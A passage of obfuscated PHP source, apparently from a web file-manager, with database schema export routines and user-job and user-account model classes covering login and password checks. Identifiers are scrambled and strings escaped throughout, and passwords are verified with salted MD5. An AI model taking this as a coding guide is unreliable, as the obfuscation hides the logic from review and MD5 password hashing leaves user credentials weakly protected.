= $©ÏÔßãµ . $ Ãâ°ìª[1120]; $¯÷æÃäÄ = $ĞÚ’éù¶ == $ Ãâ°ìª[13] ? $ Ãâ°ìª[836] : $ Ãâ°ìª[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\x6c\57\144\141\x74\x61\57{$¯÷æÃäÄ}\56\163\161\x6c", $©ÏÔßãµ); @touch($©ÏÔßãµ . $ĞÚ’éù¶ . $ Ãâ°ìª[820]); $­èÂ­Ï = fopen($‘ëÖÑ‰ğ, $ Ãâ°ìª[1095]); $¬ë¥Æï = fopen($œóš’ˆ›, $ Ãâ°ìª[1095]); if ($ĞÚ’éù¶ == $ Ãâ°ìª[13]) { $ÍÍô¥¡— = array_diff($ÍÍô¥¡—, array($ Ãâ°ìª[816], $ Ãâ°ìª[817])); $ ÂõÈäí = array($ Ãâ°ìª[1121], $ Ãâ°ìª[1122], $ Ãâ°ìª[1123]); fwrite($¬ë¥Æï, implode(PHP_EOL, $ ÂõÈäí) . PHP_EOL . PHP_EOL); foreach ($ÍÍô¥¡— as $Ô­ëÖÁ) { $¥òÜ· = $this->sqlFromSqlite($Ô­ëÖÁ); if (!$¥òÜ·[$ Ãâ°ìª[13]]) { continue; } fwrite($¬ë¥Æï, $¥òÜ·[$ Ãâ°ìª[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ô­ëÖÁ, $õô³ƒ”…)) { fwrite($­èÂ­Ï, $¥òÜ·[$ Ãâ°ìª[836]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÍÍô¥¡— as $Ô­ëÖÁ) { $¥òÜ· = $this->sqlFromMysql($Ô­ëÖÁ); if (!$¥òÜ·[$ Ãâ°ìª[836]]) { continue; } fwrite($­èÂ­Ï, $¥òÜ·[$ Ãâ°ìª[836]] . PHP_EOL . PHP_EOL); if (!in_array($Ô­ëÖÁ, $õô³ƒ”…)) { fwrite($¬ë¥Æï, $¥òÜ·[$ Ãâ°ìª[13]] . PHP_EOL . PHP_EOL); } } } fclose($­èÂ­Ï); fclose($¬ë¥Æï); $ĞÀ–Ñ¦¢ = array($ Ãâ°ìª[836] => $‘ëÖÑ‰ğ, $ Ãâ°ìª[13] => $œóš’ˆ›); return $Ê‘³èœí ? $ĞÀ–Ñ¦¢[$Ê‘³èœí] : $ĞÀ–Ñ¦¢; } public function dbType($··áˆ·ò = false) { $ó™ãêÄ =& $_SERVER[”ú…±Ú¥]; $Á»àÂ¥  = $··áˆ·ò ? $GLOBALS[$ó™ãêÄ[6]][$ó™ãêÄ[21]] : $this->database; $Á»àÂ¥  = array_change_key_case($Á»àÂ¥ ); $°’ä‚¼Ì = $Á»àÂ¥ [$ó™ãêÄ[996]]; if ($°’ä‚¼Ì == $ó™ãêÄ[993]) { $’ğÉ¬©™ = explode($ó™ãêÄ[4], $Á»àÂ¥ [$ó™ãêÄ[1002]]); $°’ä‚¼Ì = $’ğÉ¬©™[0]; } $ôéˆ•‘á = array($ó™ãêÄ[1124] => $ó™ãêÄ[13], $ó™ãêÄ[941] => $ó™ãêÄ[836]); if (isset($ôéˆ•‘á[$°’ä‚¼Ì])) { $°’ä‚¼Ì = $ôéˆ•‘á[$°’ä‚¼Ì]; } return $°’ä‚¼Ì; } public function sqlFromMysql($Ø÷´˜‡“, $¸ŞˆÁë = '') { $º³‚Êòù =& $_SERVER[”ú…±Ú¥]; $˜ñ½õº = $this->model()->db(); $£ÄÎ´€ë = $˜ñ½õº->query($º³‚Êòù[1125] . $Ø÷´˜‡“ . $º³‚Êòù[423]); if (!$£ÄÎ´€ë || !$£ÄÎ´€ë[0]) { return !1; } $›–ÁÑ = _get($£ÄÎ´€ë[0], $º³‚Êòù[1126], $º³‚Êòù[12]); if (!$›–ÁÑ) { return !1; } $Ú°ÈÑù™ = "\104\x52\117\x50\40\124\101\x42\114\105\x20\111\x46\x20\x45\x58\x49\x53\x54\123\x20\140{$Ø÷´˜‡“}\x60\73" . PHP_EOL . $›–ÁÑ . $º³‚Êòù[71]; if ($¸ŞˆÁë && $¸ŞˆÁë == $º³‚Êòù[836]) { return $Ú°ÈÑù™; } $À—ÀÉ©ó = array_change_key_case($GLOBALS[$º³‚Êòù[6]][$º³‚Êòù[21]]); $Â¸µ’’ˆ = $À—ÀÉ©ó[$º³‚Êòù[1001]]; $èîİäÉÏ = $º³‚Êòù[1127] . $Â¸µ’’ˆ . $º³‚Êòù[1128] . $Ø÷´˜‡“ . $º³‚Êòù[58]; $Ö¹éÄ›ì = $º³‚Êòù[1129] . $Ø÷´˜‡“ . $º³‚Êòù[929]; $ĞöïØÇı = $˜ñ½õº->query($èîİäÉÏ); if (empty($ĞöïØÇı)) { $èĞø¤£ = array($º³‚Êòù[836] => $º³‚Êòù[12], $º³‚Êòù[13] => $º³‚Êòù[12]); return $¸ŞˆÁë ? $èĞø¤£[$¸ŞˆÁë] : $èĞø¤£; } $ÀÊªƒ‡î = $˜ñ½õº->query($Ö¹éÄ›ì); $ÛŸËı±Ú = $º³‚Êòù[12]; $€¸â×¤° = array(); foreach ($ÀÊªƒ‡î as $µ·ªåÙğ) { if (!$ÛŸËı±Ú && $µ·ªåÙğ[$º³‚Êòù[1130]] == $º³‚Êòù[1131]) { $ÛŸËı±Ú = $µ·ªåÙğ[$º³‚Êòù[1132]]; } if (isset($€¸â×¤°[$µ·ªåÙğ[$º³‚Êòù[1130]]])) { $€¸â×¤°[$µ·ªåÙğ[$º³‚Êòù[1130]]][$º³‚Êòù[1133]][] = $µ·ªåÙğ[$º³‚Êòù[1132]]; continue; } $€¸â×¤°[$µ·ªåÙğ[$º³‚Êòù[1130]]] = array($º³‚Êòù[1134] => $µ·ªåÙğ[$º³‚Êòù[1130]], $º³‚Êòù[1133] => array($µ·ªåÙğ[$º³‚Êòù[1132]]), $º³‚Êòù[1135] => $µ·ªåÙğ[$º³‚Êòù[1136]] == $º³‚Êòù[88] ? 0 : 1); } $ˆÉæø»” = array(); foreach ($€¸â×¤° as $µ·ªåÙğ) { $ÒÔâ…× = $µ·ªåÙğ[$º³‚Êòù[1134]] == $º³‚Êòù[1131]; $õàô¤¡ó = array($º³‚Êòù[1137], $µ·ªåÙğ[$º³‚Êòù[1135]] == $º³‚Êòù[88] && !$ÒÔâ…× ? $º³‚Êòù[1138] : $º³‚Êòù[12], $º³‚Êòù[1139], $º³‚Êòù[1140] . $Ø÷´˜‡“ . $º³‚Êòù[11] . ($ÒÔâ…× ? $º³‚Êòù[1141] : $µ·ªåÙğ[$º³‚Êòù[1134]]) . $º³‚Êòù[118], $º³‚Êòù[1142], $º³‚Êòù[118] . $Ø÷´˜‡“ . $º³‚Êòù[118], $º³‚Êòù[1143] . implode($º³‚Êòù[1144], $µ·ªåÙğ[$º³‚Êòù[1133]]) . $º³‚Êòù[1145]); $ˆÉæø»”[] = implode($º³‚Êòù[53], $õàô¤¡ó) . $º³‚Êòù[71]; } $¹ ³Õİ = array(); $¹­«„§” = array($º³‚Êòù[1146] => $º³‚Êòù[1147], $º³‚Êòù[1147] => $º³‚Êòù[1147], $º³‚Êòù[326] => $º³‚Êòù[353], $º³‚Êòù[325] => $º³‚Êòù[353]); foreach ($ĞöïØÇı as $µ·ªåÙğ) { $õàô¤¡ó = array($º³‚Êòù[118] . $µ·ªåÙğ[$º³‚Êòù[1148]] . $º³‚Êòù[118], isset($¹­«„§”[$µ·ªåÙğ[$º³‚Êòù[1149]]]) ? $¹­«„§”[$µ·ªåÙğ[$º³‚Êòù[1149]]] : $µ·ªåÙğ[$º³‚Êòù[1150]], $µ·ªåÙğ[$º³‚Êòù[1151]] == $º³‚Êòù[927] ? $º³‚Êòù[1152] : $º³‚Êòù[1153], $µ·ªåÙğ[$º³‚Êòù[1148]] == $ÛŸËı±Ú ? $º³‚Êòù[1154] : $º³‚Êòù[12], $µ·ªåÙğ[$º³‚Êòù[978]] ? strtoupper(str_replace($º³‚Êòù[11], $º³‚Êòù[12], $µ·ªåÙğ[$º³‚Êòù[978]])) : $º³‚Êòù[12]); $¹ ³Õİ[] = trim(implode($º³‚Êòù[53], $õàô¤¡ó)); } $‡ÕÔ®ì® = array($º³‚Êòù[1155] . $Ø÷´˜‡“ . $º³‚Êòù[1156], $º³‚Êòù[1157] . $Ø÷´˜‡“ . $º³‚Êòù[1158], implode($º³‚Êòù[50] . PHP_EOL, $¹ ³Õİ), $º³‚Êòù[975]); $à€ß­§ì = implode(PHP_EOL, array_merge($‡ÕÔ®ì®, $ˆÉæø»”)); if ($¸ŞˆÁë && $¸ŞˆÁë == $º³‚Êòù[13]) { return $à€ß­§ì; } $èĞø¤£ = array($º³‚Êòù[836] => $Ú°ÈÑù™, $º³‚Êòù[13] => $à€ß­§ì); return $¸ŞˆÁë ? $èĞø¤£[$¸ŞˆÁë] : $èĞø¤£; } public function sqlFromSqlite($ˆËÇù•º, $„Ùƒ«ˆÓ = '') { $ÍÊµˆ€ =& $_SERVER[”ú…±Ú¥]; $‰î—»¼ = $this->model()->db(); $Èæ¤ÖÃ‚ = "\x50\x52\101\107\x4d\x41\40\x54\x41\x42\x4c\x45\x5f\x49\116\x46\x4f\x20\x28\x27{$ˆËÇù•º}\47\51"; $ß´œÛªî = "\123\x45\114\105\103\124\40\52\x20\106\x52\x4f\115\40\163\161\154\151\164\145\x5f\x6d\141\x73\164\145\162\x20\127\x48\x45\x52\105\40\x74\142\154\x5f\x6e\x61\155\145\x20\75\x20\x27{$ˆËÇù•º}\x27"; $«×ÂÀà• = $‰î—»¼->query($Èæ¤ÖÃ‚); if (empty($«×ÂÀà•)) { $˜¼«ìùÕ = array($ÍÊµˆ€[836] => $ÍÊµˆ€[12], $ÍÊµˆ€[13] => $ÍÊµˆ€[12]); return $„Ùƒ«ˆÓ ? $˜¼«ìùÕ[$„Ùƒ«ˆÓ] : $˜¼«ìùÕ; } $ş¡¦öŒ = $‰î—»¼->query($ß´œÛªî); $ñ…ÌÂû’ = $¢”Õê×‘ = array(); foreach ($ş¡¦öŒ as $Ş’Íæ„) { if ($Ş’Íæ„[$ÍÊµˆ€[33]] == $ÍÊµˆ€[317]) { $ñ…ÌÂû’[] = $Ş’Íæ„[$ÍÊµˆ€[1159]]; } else { $¢”Õê×‘[$Ş’Íæ„[$ÍÊµˆ€[32]]] = $Ş’Íæ„[$ÍÊµˆ€[1159]]; } } $®Ë¢ùÚç = array_merge(array($ÍÊµˆ€[1155] . $ˆËÇù•º . $ÍÊµˆ€[118]), $ñ…ÌÂû’, array_values($¢”Õê×‘)); $®Ë¢ùÚç = implode($ÍÊµˆ€[71] . PHP_EOL, $®Ë¢ùÚç) . $ÍÊµˆ€[71]; if ($„Ùƒ«ˆÓ && $„Ùƒ«ˆÓ == $ÍÊµˆ€[13]) { return $®Ë¢ùÚç; } $©éù Ø = array(); $¸‹º–şã = array($ÍÊµˆ€[1147] => $ÍÊµˆ€[1160], $ÍÊµˆ€[353] => $ÍÊµˆ€[1161]); $Îß²¶ä  = $ÍÊµˆ€[12]; foreach ($«×ÂÀà• as $Ş’Íæ„) { if ($Ş’Íæ„[$ÍÊµˆ€[57]] == $ÍÊµˆ€[88]) { $Îß²¶ä  = $Ş’Íæ„[$ÍÊµˆ€[32]]; } $Õşøöû = array($ÍÊµˆ€[423] . $Ş’Íæ„[$ÍÊµˆ€[32]] . $ÍÊµˆ€[423], isset($¸‹º–şã[$Ş’Íæ„[$ÍÊµˆ€[33]]]) ? $¸‹º–şã[$Ş’Íæ„[$ÍÊµˆ€[33]]] : $Ş’Íæ„[$ÍÊµˆ€[33]], $Ş’Íæ„[$ÍÊµˆ€[35]] == $ÍÊµˆ€[88] ? $ÍÊµˆ€[1152] : $ÍÊµˆ€[1162] . $Ş’Íæ„[$ÍÊµˆ€[56]], $Ş’Íæ„[$ÍÊµˆ€[57]] == $ÍÊµˆ€[88] ? $ÍÊµˆ€[1163] : $ÍÊµˆ€[12]); $©éù Ø[] = trim(implode($ÍÊµˆ€[53], $Õşøöû)); } foreach ($¢”Õê×‘ as $ã¬µó => $ëìºÎˆˆ) { $¯õ×ˆ» = str_replace($ÍÊµˆ€[1164] . $ˆËÇù•º . $ÍÊµˆ€[11], $ÍÊµˆ€[12], $ã¬µó); $÷ıÜ¨¸Ó = str_replace(array($ÍÊµˆ€[118], $ÍÊµˆ€[986]), $ÍÊµˆ€[423], substr($ëìºÎˆˆ, stripos($ëìºÎˆˆ, $ÍÊµˆ€[298]))); if ($¯õ×ˆ» == $ÍÊµˆ€[1141]) { $óà˜ = $ÍÊµˆ€[1165] . $Îß²¶ä  . $ÍÊµˆ€[1166]; } else { $óà˜ = (stripos($¯õ×ˆ», $ÍÊµˆ€[11]) ? $ÍÊµˆ€[1167] : $ÍÊµˆ€[12]) . ($ÍÊµˆ€[1168] . $¯õ×ˆ» . $ÍÊµˆ€[1169] . $÷ıÜ¨¸Ó); } $©éù Ø[] = $óà˜; } $× §Ô Ë = array($ÍÊµˆ€[1170] . $ˆËÇù•º . $ÍÊµˆ€[1171], $ÍÊµˆ€[1172] . $ˆËÇù•º . $ÍÊµˆ€[1173], implode($ÍÊµˆ€[50] . PHP_EOL, $©éù Ø), $ÍÊµˆ€[1174]); $²»ÌşÀû = implode(PHP_EOL, $× §Ô Ë); if ($„Ùƒ«ˆÓ && $„Ùƒ«ˆÓ == $ÍÊµˆ€[836]) { return $²»ÌşÀû; } $˜¼«ìùÕ = array($ÍÊµˆ€[836] => $²»ÌşÀû, $ÍÊµˆ€[13] => $®Ë¢ùÚç); return $„Ùƒ«ˆÓ ? $˜¼«ìùÕ[$„Ùƒ«ˆÓ] : $˜¼«ìùÕ; } } goto Cù¬ÊÄëâ³; DõèÅÅ›î¿: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\152\157\142\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\x65\x73\x63", "\163\157\162\164"); const JOB_KEY = "\163\x65\154\x66\x4a\x6f\x62\114\x69\x73\164"; public function listData($Ú¯¡–ù = false, $×Ñšš˜ = "\x73\x6f\162\164", $÷Ä×èÛâ = false) { return parent::listData($Ú¯¡–ù, $×Ñšš˜, $÷Ä×èÛâ); } public function remove($Í·–²¾) { return parent::remove($Í·–²¾); } public function add($Í‹«§œı) { $†áñŠ¿˜ =& $_SERVER[”ú…±Ú¥]; if ($this->findByName($Í‹«§œı[$†áñŠ¿˜[32]])) { return !1; } $Í‹«§œı[$†áñŠ¿˜[1885]] = $this->getSort(); return parent::insert($Í‹«§œı); } private function getSort() { $ï¼ÚÃƒ =& $_SERVER[”ú…±Ú¥]; $í±˜–¢‰ = parent::listData(); $¶”¥Ô…ˆ = array_to_keyvalue($í±˜–¢‰, $ï¼ÚÃƒ[12], $ï¼ÚÃƒ[1885]); return empty($¶”¥Ô…ˆ) ? 0 : max($¶”¥Ô…ˆ) + 1; } public function update($ŸÖ¬æ¾, $Ò¨È™´œ) { $°Äƒ–’¨ =& $_SERVER[”ú…±Ú¥]; $¥ãÚ’ßå = parent::listData($ŸÖ¬æ¾); $Ìº˜İïà = $this->findByName($Ò¨È™´œ[$°Äƒ–’¨[32]]); if (!$¥ãÚ’ßå || $Ìº˜İïà && $Ìº˜İïà[$°Äƒ–’¨[437]] != $¥ãÚ’ßå[$°Äƒ–’¨[437]]) { return !1; } return parent::update($ŸÖ¬æ¾, $Ò¨È™´œ); } public function setUserJob($‚ÛÌŞşŸ, $ûÔÌÜ) { $ÏÛª›Á =& $_SERVER[”ú…±Ú¥]; if (!is_array($ûÔÌÜ)) { $ûÔÌÜ = array($ûÔÌÜ); } $íÊ´¡ÄÏ = parent::listData(); $¨¾Í¿Ö” = array_to_keyvalue($íÊ´¡ÄÏ, $ÏÛª›Á[32]); $ÏôŠ¹Şƒ = $ÏÛª›Á[416]; foreach ($ûÔÌÜ as $íæ£ºÇ) { if ($¨¾Í¿Ö”[$íæ£ºÇ]) { $ÏôŠ¹Şƒ .= $¨¾Í¿Ö”[$íæ£ºÇ][$ÏÛª›Á[437]] . $ÏÛª›Á[50]; } else { $À÷é¤¡ñ = $this->add($íæ£ºÇ); $ÏôŠ¹Şƒ .= $À÷é¤¡ñ . $ÏÛª›Á[50]; } } $ÏôŠ¹Şƒ = rtrim($ÏôŠ¹Şƒ, $ÏÛª›Á[50]); Model($ÏÛª›Á[563])->metaSet($‚ÛÌŞşŸ, self::JOB_KEY, $ÏôŠ¹Şƒ); } public function getUserJob($©·’Á¥) { $Š½âÀ· = Model($_SERVER[”ú…±Ú¥][563])->metaGet($©·’Á¥); return $this->getUserJobInfo($Š½âÀ·[self::JOB_KEY]); } public function getUserJobInfo($÷Û™ĞÎÜ) { $ƒ’¸Å…Ü =& $_SERVER[”ú…±Ú¥]; $›¡‘º¡û = explode($ƒ’¸Å…Ü[50], $÷Û™ĞÎÜ); $ªÉËÖÚù = parent::listData(); $ªÉËÖÚù = array_remove_key($ªÉËÖÚù, $ƒ’¸Å…Ü[211]); $Ş ÷¸¼ = array(); foreach ($›¡‘º¡û as $ò©ÏÌÆÊ) { if (isset($ªÉËÖÚù[$ò©ÏÌÆÊ])) { $Ş ÷¸¼[] = $ªÉËÖÚù[$ò©ÏÌÆÊ]; } } return $Ş ÷¸¼; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\141\x62\154\x65\116\141\155\145" => "\165\163\x65\x72\x5f\155\x65\164\x61", "\x6d\145\164\x61\106\151\x65\x6c\x64" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\x75\163\x65\162\111\x44\x2c\x6e\151\143\x6b\116\141\155\145\54\156\141\155\x65\54\141\x76\141\x74\141\162\54\x73\x65\x78\54\163\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¡”İõÖâ) { $‡¬ú”ƒÑ =& $_SERVER[”ú…±Ú¥]; $‡¾„òƒµ = $‡¬ú”ƒÑ[2309]; return array($‡¬ú”ƒÑ[1939] => array($¡”İõÖâ[0], $‡¾„òƒµ), $‡¬ú”ƒÑ[1941] => array($¡”İõÖâ[0], $‡¾„òƒµ), $‡¬ú”ƒÑ[2310] => array($¡”İõÖâ[0], $‡¾„òƒµ)); } protected function getInfo($ğœ¢ÄÅ, $â»Ñë½É = false) { $†šÉ‘­ü = $this->getInfoSimple($ğœ¢ÄÅ); if (!is_array($†šÉ‘­ü)) { return array(); } if ($â»Ñë½É) { return $this->_getInfoApply($†šÉ‘­ü); } return $this->cacheFunctionGet($_SERVER[”ú…±Ú¥][1943], $ğœ¢ÄÅ); } protected function getInfoFull($éÍü²ä”, $¤£¾ºÀƒ = false) { $²†İÇ¢ = $this->getInfoSimple($éÍü²ä”); if (!is_array($²†İÇ¢)) { return array(); } if ($¤£¾ºÀƒ) { return $this->_getInfoApply($²†İÇ¢, !0); } return $this->cacheFunctionGet($_SERVER[”ú…±Ú¥][2311], $éÍü²ä”); } private function _getInfoApply($ŒÄ€Ğòª, $òÁÀ…Ú = false) { $æÆ×™–Ã =& $_SERVER[”ú…±Ú¥]; if (!$ŒÄ€Ğòª) { return $ŒÄ€Ğòª; } $™ ˆ´Ìú = md5($æÆ×™–Ã[2312] . $ŒÄ€Ğòª[$æÆ×™–Ã[918]] . $æÆ×™–Ã[2313] . $ŒÄ€Ğòª[$æÆ×™–Ã[32]]); $ŒÄ€Ğòª = $this->_listDataApplyItem($ŒÄ€Ğòª); $áÖÊ•ˆ‹ = Model($æÆ×™–Ã[1362])->metaGet($ŒÄ€Ğòª[$æÆ×™–Ã[87]][$æÆ×™–Ã[440]]); $ŒÄ€Ğòª[$æÆ×™–Ã[2314]] = $™ ˆ´Ìú; $ŒÄ€Ğòª[$æÆ×™–Ã[87]][$æÆ×™–Ã[2135]] = isset($áÖÊ•ˆ‹[$æÆ×™–Ã[2136]]) ? $áÖÊ•ˆ‹[$æÆ×™–Ã[2136]] : null; if ($òÁÀ…Ú) { $ŒÄ€Ğòª[$æÆ×™–Ã[504]] = $this->metaGet($ŒÄ€Ğòª[$æÆ×™–Ã[1671]]); } return $ŒÄ€Ğòª; } protected function getInfoSimple($ÃÑ¾Å­ô, $–Ãò™·û = false) { $µ“î¿®ï =& $_SERVER[”ú…±Ú¥]; if (!$ÃÑ¾Å­ô) { return array(); } if ($–Ãò™·û) { $³±àæºĞ = $this->where(array($µ“î¿®ï[1671] => intval($ÃÑ¾Å­ô)))->find(); if (!is_array($³±àæºĞ)) { return array(); } $³±àæºĞ[$µ“î¿®ï[571]] = Action($µ“î¿®ï[2315])->parseUrl($³±àæºĞ[$µ“î¿®ï[571]]); return $³±àæºĞ; } return $this->cacheFunctionGet($µ“î¿®ï[1944], $ÃÑ¾Å­ô); } protected function getInfoSimpleOuter($Ä› “Îş) { $¶Ì±´Ğ² =& $_SERVER[”ú…±Ú¥]; if (!$Ä› “Îş || $Ä› “Îş == 0) { return array($¶Ì±´Ğ²[1671] => $¶Ì±´Ğ²[208], $¶Ì±´Ğ²[32] => $¶Ì±´Ğ²[162] . LNG($¶Ì±´Ğ²[2316]) . $¶Ì±´Ğ²[164], $¶Ì±´Ğ²[571] => STATIC_PATH . $¶Ì±´Ğ²[2317]); } $ç•øÎ¥± = $this->cacheFunctionGet($¶Ì±´Ğ²[1944], $Ä› “Îş); $ÀìäŠê¶ = array_field_key($ç•øÎ¥±, explode($¶Ì±´Ğ²[50], $this->simpleField)); if (!$ÀìäŠê¶) { return array($¶Ì±´Ğ²[1671] => $¶Ì±´Ğ²[1217], $¶Ì±´Ğ²[32] => $¶Ì±´Ğ²[162] . LNG($¶Ì±´Ğ²[2318]) . $¶Ì±´Ğ²[164], $¶Ì±´Ğ²[571] => STATIC_PATH . $¶Ì±´Ğ²[2319]); } $ÀìäŠê¶[$¶Ì±´Ğ²[571]] = Action($¶Ì±´Ğ²[2315])->parseUrl($ÀìäŠê¶[$¶Ì±´Ğ²[571]]); return $ÀìäŠê¶; } protected function groupUser($Ÿœº¾†) { } public static function errorLang($¼ÓÉ†Õ­) { $ß’úîœØ =& $_SERVER[”ú…±Ú¥]; $®É·é = array(self::ERROR_USER_NOT_EXISTS => $ß’úîœØ[2320], self::ERROR_USER_PASSWORD_ERROR => $ß’úîœØ[2321], self::ERROR_USER_EXIST_NAME => $ß’úîœØ[2322], self::ERROR_USER_EXIST_PHONE => $ß’úîœØ[2323], self::ERROR_USER_EXIST_EMAIL => $ß’úîœØ[2324], self::ERROR_USER_LOGIN_LOCK => $ß’úîœØ[2325], self::ERROR_IP_NOT_ALLOW => $ß’úîœØ[2326], self::ERROR_USER_EXIST_NICKNAME => $ß’úîœØ[2327]); return LNG($®É·é[$¼ÓÉ†Õ­]); } public function getInfoByMeta($–±£”ªñ, $´£¿îĞã) { $Ã˜£ =& $_SERVER[”ú…±Ú¥]; $éÅïİŸĞ = Model($Ã˜£[2328])->where(array($Ã˜£[94] => $–±£”ªñ, $Ã˜£[412] => $´£¿îĞã))->find(); if ($éÅïİŸĞ) { return $this->getInfo($éÅïİŸĞ[$Ã˜£[1671]]); } return !1; } public function userLoginCheck($Àé÷€ Ÿ, $Ø§ºÄƒ¨) { $˜ßÖ™Üñ =& $_SERVER[”ú…±Ú¥]; $Æ‘Ö±·˜ = $this->userLoginFind($Àé÷€ Ÿ); if (!$Æ‘Ö±·˜) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Æ‘Ö±·˜[$˜ßÖ™Üñ[1671]], $Ø§ºÄƒ¨)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Æ‘Ö±·˜[$˜ßÖ™Üñ[1671]]); } public function userLoginFind($—ø©Œ£Á) { $µ¹¸÷ˆù =& $_SERVER[”ú…±Ú¥]; $ù´Ïõ¥˜ = array($µ¹¸÷ˆù[32] => $—ø©Œ£Á, $µ¹¸÷ˆù[570] => $—ø©Œ£Á, $µ¹¸÷ˆù[343] => $—ø©Œ£Á, $µ¹¸÷ˆù[2329] => $—ø©Œ£Á, $µ¹¸÷ˆù[1029] => $µ¹¸÷ˆù[1031]); if ($this->nickNameRpt()) { unset($ù´Ïõ¥˜[$µ¹¸÷ˆù[570]]); } return $this->where($ù´Ïõ¥˜)->find(); } public function clearCache($ Éå×Ü”) { $‰Ñ‘Ûõ‹ =& $_SERVER[”ú…±Ú¥]; $this->cacheFunctionClear($‰Ñ‘Ûõ‹[1943], $ Éå×Ü”); $this->cacheFunctionClear($‰Ñ‘Ûõ‹[1944], $ Éå×Ü”); $this->cacheFunctionClear($‰Ñ‘Ûõ‹[2311], $ Éå×Ü”); } public function userPasswordCheck($«Ì€‡ä–, $İÒì•Áò) { $–²ˆëÄ™ =& $_SERVER[”ú…±Ú¥]; $’«»§Õğ = $this->where(array($–²ˆëÄ™[1671] => intval($«Ì€‡ä–)))->find(); $µÒ‚Ùğè = $this->metaGet($«Ì€‡ä–); $÷‘µ£«ß = isset($µÒ‚Ùğè[$–²ˆëÄ™[2330]]) ? $µÒ‚Ùğè[$–²ˆëÄ™[2330]] : $–²ˆëÄ™[12]; if (md5($÷‘µ£«ß . trim($İÒì•Áò)) !== $’«»§Õğ[$–²ˆëÄ™[918]]) { return !1; } return !0; } public function userAdd($ÀÃ‡¿·Ğ) { $İ†Öç¢Ş =& $_SERVER[”ú…±Ú¥]; $Ä¤†öÖÂ = array($İ†Öç¢Ş[458] => $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[32]], $İ†Öç¢Ş[2331] => $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[1552]], $İ†Öç¢Ş[2332] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[343]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[343]] : $İ†Öç¢Ş[12], $İ†Öç¢Ş[2333] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[2329]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[2329]] : $İ†Öç¢Ş[12], $İ†Öç¢Ş[2334] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[570]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[570]] : $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[32]], $İ†Öç¢Ş[2335] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[571]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[571]] : $İ†Öç¢Ş[12], $İ†Öç¢Ş[2336] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[2337]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[2337]] : 1, $İ†Öç¢Ş[2338] => $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[918]], $İ†Öç¢Ş[1945] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[1848]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[1848]] : 1024 * 1024 * 20, $İ†Öç¢Ş[1946] => 0, $İ†Öç¢Ş[2339] => 0, $İ†Öç¢Ş[1990] => isset($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[782]]) ? $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[782]] : 1); if (!empty($ÀÃ‡¿·Ğ[$İ†Öç¢Ş[1671]])) { $Ä¤†öÖÂ[$İ†Öç¢Ş[1671]] = $ÀÃ‡¿·Ğ[$İ†Öç¢Ş[1671]]; } $”áœŸùÔ = $this->_checkExist($ÀÃ‡¿·Ğ); if ($”áœŸùÔ !== !0) { return $”áœŸùÔ; } if (!empty($Ä¤†öÖÂ[$İ†Öç¢Ş[571]]) && strlen($Ä¤†öÖÂ[$İ†Öç¢Ş[571]]) > 255) { $Ä¤†öÖÂ[$İ†Öç¢Ş[571]] = $İ†Öç¢Ş[12]; } $ğĞš‘ğĞ = $this->add($Ä¤†öÖÂ); $«ºúàµÅ = array($İ†Öç¢Ş[2338] => $Ä¤†öÖÂ[$İ†Öç¢Ş[918]], $İ†Öç¢Ş[2334] => $Ä¤†öÖÂ[$İ†Öç¢Ş[570]]); $this->userEdit($ğĞš‘ğĞ, $«ºúàµÅ); Model($İ†Öç¢Ş[1362])->userRootAdd($ğĞš‘ğĞ); return $ğĞš‘ğĞ; } protected function userEditTest($ÙÈí±éé, $’Ìé¤¤) { return $this->call($_SERVER[”ú…±Ú¥][2340], $ÙÈí±éé, $’Ìé¤¤); } protected function userEdit($î¬¤¹ÄÛ, $ÌªŒâ¿È) { $ù››¯Õµ =& $_SERVER[”ú…±Ú¥]; $¯²şÑ› = $this->getInfoSimple($î¬¤¹ÄÛ); if (!$¯²şÑ›) { return !1; } $ïŠ›£Øâ = $this->_checkExist($ÌªŒâ¿È, $î¬¤¹ÄÛ); if ($ïŠ›£Øâ !== !0) { return $ïŠ›£Øâ; } if (isset($ÌªŒâ¿È[$ù››¯Õµ[918]]) && trim($ÌªŒâ¿È[$ù››¯Õµ[918]]) != $ù››¯Õµ[12]) { $Ş«Ú¹ = $this->metaGet($î¬¤¹ÄÛ); if (empty($Ş«Ú¹[$ù››¯Õµ[2330]])) { $Ş«Ú¹[$ù››¯Õµ[2330]] = rand_string(10); Model($ù››¯Õµ[542])->metaSet($î¬¤¹ÄÛ, $ù››¯Õµ[2330], $Ş«Ú¹[$ù››¯Õµ[2330]]); } $ÌªŒâ¿È[$ù››¯Õµ[918]] = md5($Ş«Ú¹[$ù››¯Õµ[2330]] . 